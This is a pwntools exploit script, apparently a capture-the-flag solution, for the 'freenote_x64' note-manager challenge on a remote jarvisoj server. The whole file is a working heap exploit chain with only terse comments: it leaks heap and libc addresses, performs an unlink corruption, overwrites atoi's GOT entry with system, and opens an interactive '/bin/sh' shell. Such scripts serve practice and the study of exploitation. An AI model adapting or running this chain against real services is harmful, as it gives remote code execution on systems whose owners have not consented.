from pwn import *

r = remote('pwn2.jarvisoj.com',9886)
elf = ELF('./freenote_x64')
libc = ELF('./libc-2.19.so')

def list():
    r.sendlineafter('choice: ', '1')

def new(payload):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('new note: ', str(len(payload)))
    r.sendafter('note: ', payload)

def edit(num,payload):
    r.sendlineafter('choice: ', '3')
    r.sendlineafter('number: ', str(num))
    r.sendlineafter('note: ', str(len(payload)))
    r.sendafter('your note: ', payload)

def delete(num):
    r.sendlineafter('choice: ', '4')
    r.sendlineafter('number: ', str(num))

#leak heap base
new('a' * 0x80) #0
new('a' * 0x80) #1
new('a' * 0x80) #2
new('a' * 0x80) #3
new('a' * 0x80) #4
#malloc chunk4 to avoid chunk3 consolidated to topchunk

delete(3)
delete(1)
edit(0,'a' * 0x80 +'b' * 0x10)
#overwrite next chunk'header to leak

list()

r.recvuntil('b' * 0x10)
heap_base = u64(r.recvuntil('\x0a', drop=True).ljust(0x8,'\x00')) - 0x19c0 # 0x1810 + 3 * 0x90
chunk0 = heap_base + 0x20
success('leak heap base')
success('heapbase:' + hex(heap_base))

sleep(1)

#unlink
payload = p64(0) + p64(0x80) + p64(chunk0 - 3 * 8) + p64(chunk0 - 2 * 8) + 'a' * (0x80 - 4 * 8) + p64(0x80) + p64(0x90)
payload = payload.ljust(0x100,'\xbb') # 0x80 * 2
edit(0, payload)

delete(1)
success('unlink')

sleep(1)

#leak libc base
payload2 = p64(2) + p64(1) + p64(0x80) + p64(chunk0) + p64(1) + p64(8) + p64(elf.got['atoi'])
payload2 = payload2.ljust(0x100, '\xbb')
edit(0, payload2)

list()

r.recvuntil('1. ')
libc_base = u64(r.recvuntil('\x0a', drop=True).ljust(0x8, '\x00')) - libc.sym['atoi']
success(hex(libc_base))

#modify atoi to system to getshell
sys_addr = libc_base + libc.sym['system']

edit(1, p64(sys_addr)) # *(&atoi@got) = sys_addr

r.sendlineafter('choice: ', '/bin/sh\0')

r.interactive()